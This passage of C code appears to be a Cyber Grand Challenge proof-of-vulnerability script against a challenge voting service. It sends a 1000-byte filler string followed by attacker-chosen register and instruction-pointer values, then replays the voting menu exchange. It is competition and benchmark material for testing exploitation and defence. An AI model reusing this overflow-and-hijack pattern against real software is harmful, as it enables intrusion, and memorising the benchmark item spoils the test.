         "\x51\x70\x56\x76\x6c\x4a\x71\x48\x76\x4a\x74\x52\x4f\x64\x69\x4a"
         "\x72\x4c\x6a\x47\x42\x67\x73\x4b\x74\x46\x4c\x76\x77\x70\x66\x4f"
         "\x50\x4f\x58\x4f\x4c\x4f\x43\x6b\x58\x48\x67\x48\x4b\x79\x73\x77"
         "\x58\x6f\x55\x6e\x77\x63\x6f\x4f\x41\x77\x4f\x45\x42\x59\x41\x4c"
         "\x77\x47\x42\x73\x67\x47\x5a\x42\x7a\x7a\x51\x67\x6b\x66\x51\x6f"
         "\x52\x48\x68\x73\x69\x78\x77\x78\x4d\x69\x42\x54\x64\x66\x74\x76"
         "\x63\x64\x4c\x75\x4c\x65\x45\x71\x6d\x46\x4a\x63\x5a\x45\x66\x72"
         "\x52\x74\x6d\x4b\x78\x49\x67\x77\x4f\x71\x6e\x6a\x54\x4b\x47\x56"
         "\x42\x77\x6f\x6c\x4b\x67\x4e\x65\x73\x43\x70\x59\x70\x4f\x46\x43"
         "\x51\x55\x55\x77\x50\x77\x59\x4e\x68\x56\x76\x5a\x55\x44\x52\x64"
         "\x57\x4d\x75\x47\x6a\x79\x52\x4d\x4f\x44\x68\x62\x69\x6e\x61\x6a"
         "\x4f\x42\x43\x54\x47\x61\x6d\x71\x75\x4e\x4a\x42\x4f\x77\x61\x47"
         "\x46\x59\x78\x6b\x7a\x4c\x49\x43\x56\x79\x72\x50\x5a\x6b\x6c\x4c"
         "\x68\x6b\x62\x6a\x52\x63\x57\x44\x4f\x78\x70\x64\x76\x57\x62\x67"
         "\x79\x59\x4f\x59\x4e\x64\x67\x78\x61\x66\x44\x6c\x6a\x6b\x75\x43"
         "\x61\x6e\x42\x71\x49\x61\x52\x43\x41\x63\x75\x70\x62\x68\x76\x43"
         "\x51\x53\x6d\x6c\x63\x4d\x77\x45\x43\x4e\x4d\x52\x79\x6c\x54\x58"
         "\x6f\x41\x57\x71\x48\x62\x72\x6f";
      static unsigned int write_00028_00000_len = 1000;
      unsigned char *write_00028 = NULL;
      unsigned int write_00028_len = 0;
      write_00028 = cgc_append_buf(write_00028, &write_00028_len, write_00028_00000, write_00028_00000_len);
      if (write_00028_len > 0) {
         cgc_transmit_all(1, write_00028, write_00028_len);
      }
      cgc_free(write_00028);
   } while (0);

   // cgc_write TYPE1_REG
   cgc_transmit_all(1, &t1vals.regval, 4);
   // do {
   //    //*** writing data
   //    unsigned char *write_00029 = NULL;
   //    unsigned int write_00029_len = 0;
   //    write_00029 = append_var("TYPE1_REG", write_00029, &write_00029_len);
   //    if (write_00029_len > 0) {
   //       cgc_transmit_all(1, write_00029, write_00029_len);
   //    }
   //    free(write_00029);
   // } while (0);
   do {
      //*** writing data
      static unsigned char write_00030_00000[] = 
         "\x72\x71\x59\x70";
      static unsigned int write_00030_00000_len = 4;
      unsigned char *write_00030 = NULL;
      unsigned int write_00030_len = 0;
      write_00030 = cgc_append_buf(write_00030, &write_00030_len, write_00030_00000, write_00030_00000_len);
      if (write_00030_len > 0) {
         cgc_transmit_all(1, write_00030, write_00030_len);
      }
      cgc_free(write_00030);
   } while (0);

   // cgc_write TYPE1_IP
   cgc_transmit_all(1, &t1vals.ipval, 4);
   // do {
   //    //*** writing data
   //    unsigned char *write_00031 = NULL;
   //    unsigned int write_00031_len = 0;
   //    write_00031 = append_var("TYPE1_IP", write_00031, &write_00031_len);
   //    if (write_00031_len > 0) {
   //       cgc_transmit_all(1, write_00031, write_00031_len);
   //    }
   //    free(write_00031);
   // } while (0);
   do {
      //*** writing data
      static unsigned char write_00032_00000[] = 
         "\x0a";
      static unsigned int write_00032_00000_len = 1;
      unsigned char *write_00032 = NULL;
      unsigned int write_00032_len = 0;
      write_00032 = cgc_append_buf(write_00032, &write_00032_len, write_00032_00000, write_00032_00000_len);
      if (write_00032_len > 0) {
         cgc_transmit_all(1, write_00032, write_00032_len);
      }
      cgc_free(write_00032);
   } while (0);
   do {
      unsigned char *read_00044;
      unsigned int read_00044_len;
      unsigned int read_00044_ptr = 0;
      //**** length cgc_read
      read_00044_len = 54;
      read_00044 = (unsigned char*)cgc_malloc(read_00044_len);
      int read_00044_res = cgc_length_read(0, read_00044, read_00044_len);
      if (read_00044_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00044_00000[] = 
         "\x31\x35\x3a\x20\x4d\x61\x69\x6e\x20\x4d\x65\x6e\x75\x0a\x00\x33"
         "\x36\x2e\x20\x56\x6f\x74\x65\x0a\x00\x35\x34\x2e\x20\x41\x64\x64"
         "\x20\x43\x61\x6e\x64\x69\x64\x61\x74\x65\x0a\x00\x39\x35\x2e\x20"
         "\x51\x75\x69\x74\x0a\x00";
      read_00044_ptr += cgc_data_match(read_00044 + read_00044_ptr, read_00044_len - read_00044_ptr, match_00044_00000, 54);
      cgc_free(read_00044);
      if (read_00044_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00045;
      unsigned int read_00045_len;
      unsigned int read_00045_ptr = 0;
      //**** length cgc_read
      read_00045_len = 19;
      read_00045 = (unsigned char*)cgc_malloc(read_00045_len);
      int read_00045_res = cgc_length_read(0, read_00045, read_00045_len);
      if (read_00045_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00045_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00045_ptr += cgc_data_match(read_00045 + read_00045_ptr, read_00045_len - read_00045_ptr, match_00045_00000, 19);
      cgc_free(read_00045);
      if (read_00045_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00033_00000[] = 
         "\x33\x36\x0a";
      static unsigned int write_00033_00000_len = 3;
      unsigned char *write_00033 = NULL;
      unsigned int write_00033_len = 0;
      write_00033 = cgc_append_buf(write_00033, &write_00033_len, write_00033_00000, write_00033_00000_len);
      if (write_00033_len > 0) {
         cgc_transmit_all(1, write_00033, write_00033_len);
      }
      cgc_free(write_00033);
   } while (0);
   do {
      unsigned char *read_00046;
      unsigned int read_00046_len;
      unsigned int read_00046_ptr = 0;
      //**** length cgc_read
      read_00046_len = 43;
      read_00046 = (unsigned char*)cgc_malloc(read_00046_len);
      int read_00046_res = cgc_length_read(0, read_00046, read_00046_len);
      if (read_00046_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00046_00000[] = 
         "\x53\x65\x6c\x65\x63\x74\x20\x6f\x6e\x65\x20\x63\x61\x6e\x64\x69"
         "\x64\x61\x74\x65\x20\x66\x72\x6f\x6d\x20\x74\x68\x65\x20\x66\x6f"
         "\x6c\x6c\x6f\x6f\x77\x69\x6e\x67\x3a\x0a\x00";
      read_00046_ptr += cgc_data_match(read_00046 + read_00046_ptr, read_00046_len - read_00046_ptr, match_00046_00000, 43);
      cgc_free(read_00046);
      if (read_00046_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00047;
      unsigned int read_00047_len;
      unsigned int read_00047_ptr = 0;
      //**** length cgc_read
      read_00047_len = 25;
      read_00047 = (unsigned char*)cgc_malloc(read_00047_len);
      int read_00047_res = cgc_length_read(0, read_00047, read_00047_len);
      if (read_00047_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00047_00000[] = 
         "\x09\x31\x3a\x20\x69\x54\x78\x66\x4a\x20\x61\x78\x5a\x45\x6c\x64"
         "\x57\x56\x56\x57\x52\x47\x4c\x56\x0a";
      read_00047_ptr += cgc_data_match(read_00047 + read_00047_ptr, read_00047_len - read_00047_ptr, match_00047_00000, 25);
      cgc_free(read_00047);
      if (read_00047_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00048;
      unsigned int read_00048_len;
      unsigned int read_00048_ptr = 0;
      //**** length cgc_read
      read_00048_len = 19;
      read_00048 = (unsigned char*)cgc_malloc(read_00048_len);
      int read_00048_res = cgc_length_read(0, read_00048, read_00048_len);
      if (read_00048_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00048_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00048_ptr += cgc_data_match(read_00048 + read_00048_ptr, read_00048_len - read_00048_ptr, match_00048_00000, 19);
      cgc_free(read_00048);
      if (read_00048_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00034_00000[] = 
         "\x31\x0a";
      static unsigned int write_00034_00000_len = 2;
      unsigned char *write_00034 = NULL;
      unsigned int write_00034_len = 0;
      write_00034 = cgc_append_buf(write_00034, &write_00034_len, write_00034_00000, write_00034_00000_len);
      if (write_00034_len > 0) {
         cgc_transmit_all(1, write_00034, write_00034_len);
      }
      cgc_free(write_00034);
   } while (0);
   do {
      unsigned char *read_00049;
      unsigned int read_00049_len;
      unsigned int read_00049_ptr = 0;
      //**** length cgc_read
      read_00049_len = 14;
      read_00049 = (unsigned char*)cgc_malloc(read_00049_len);
      int read_00049_res = cgc_length_read(0, read_00049, read_00049_len);
      if (read_00049_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00049_00000[] = 
         "\x43\x6f\x6e\x66\x69\x72\x6d\x61\x74\x69\x6f\x6e\x20\x23";
      read_00049_ptr += cgc_data_match(read_00049 + read_00049_ptr, read_00049_len - read_00049_ptr, match_00049_00000, 14);
      cgc_free(read_00049);
      if (read_00049_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00050;
      unsigned int read_00050_len;
      unsigned int read_00050_ptr = 0;
      //**** delimited cgc_read
      static unsigned char read_00050_delim[] = 
         "\x2e";
      read_00050 = NULL;
      read_00050_len = 0;
      int read_00050_res = cgc_delimited_read(0, &read_00050, &read_00050_len, read_00050_delim, 1);
      if (read_00050_res) {} //silence unused variable warning
      //**** cgc_read assign to var "voteid12341234" from slice
      cgc_assign_from_slice("voteid12341234", read_00050, read_00050_len - read_00050_ptr, 0, 0, 1);
      cgc_free(read_00050);
      if (read_00050_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00051;
      unsigned int read_00051_len;
      unsigned int read_00051_ptr = 0;
      //**** length cgc_read
      read_00051_len = 52;
      read_00051 = (unsigned char*)cgc_malloc(read_00051_len);
      int read_00051_res = cgc_length_read(0, read_00051, read_00051_len);
      if (read_00051_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00051_00000[] = 
         "\x20\x56\x6f\x74\x65\x20\x72\x65\x63\x6f\x72\x64\x65\x64\x20\x66"
         "\x6f\x72\x20\x63\x61\x6e\x64\x69\x64\x61\x74\x65\x3a\x20\x69\x54"
         "\x78\x66\x4a\x20\x61\x78\x5a\x45\x6c\x64\x57\x56\x56\x57\x52\x47"
         "\x4c\x56\x2e\x0a";
      read_00051_ptr += cgc_data_match(read_00051 + read_00051_ptr, read_00051_len - read_00051_ptr, match_00051_00000, 52);
      cgc_free(read_00051);
      if (read_00051_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00052;
      unsigned int read_00052_len;
      unsigned int read_00052_ptr = 0;
      //**** length cgc_read
      read_00052_len = 41;
      read_00052 = (unsigned char*)cgc_malloc(read_00052_len);
      int read_00052_res = cgc_length_read(0, read_00052, read_00052_len);
      if (read_00052_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00052_00000[] = 
         "\x31\x34\x3a\x20\x4c\x6f\x67\x69\x6e\x0a\x00\x33\x38\x2e\x20\x52"
         "\x65\x67\x69\x73\x74\x65\x72\x20\x56\x6f\x74\x65\x72\x0a\x00\x39"
         "\x35\x2e\x20\x51\x75\x69\x74\x0a\x00";
      read_00052_ptr += cgc_data_match(read_00052 + read_00052_ptr, read_00052_len - read_00052_ptr, match_00052_00000, 41);
      cgc_free(read_00052);
      if (read_00052_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00053;
      unsigned int read_00053_len;
      unsigned int read_00053_ptr = 0;
      //**** length cgc_read
      read_00053_len = 19;
      read_00053 = (unsigned char*)cgc_malloc(read_00053_len);
      int read_00053_res = cgc_length_read(0, read_00053, read_00053_len);
      if (read_00053_res) {} //silence unused variable warning
      //**** cgc_read match data
      static unsigned char match_00053_00000[] = 
         "\x43\x68\x6f\x6f\x73\x65\x20\x61\x6e\x20\x6f\x70\x74\x69\x6f\x6e"
         "\x3a\x20\x00";
      read_00053_ptr += cgc_data_match(read_00053 + read_00053_ptr, read_00053_len - read_00053_ptr, match_00053_00000, 19);
      cgc_free(read_00053);
      if (read_00053_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00035_00000[] = 
         "\x39\x35\x0a";
      static unsigned int write_00035_00000_len = 3;
      unsigned char *write_00035 = NULL;
      unsigned int write_00035_len = 0;
      write_00035 = cgc_append_buf(write_00035, &write_00035_len, write_00035_00000, write_00035_00000_len);
      if (write_00035_len > 0) {
         cgc_transmit_all(1, write_00035, write_00035_len);
      }
      cgc_free(write_00035);
   } while (0);
}
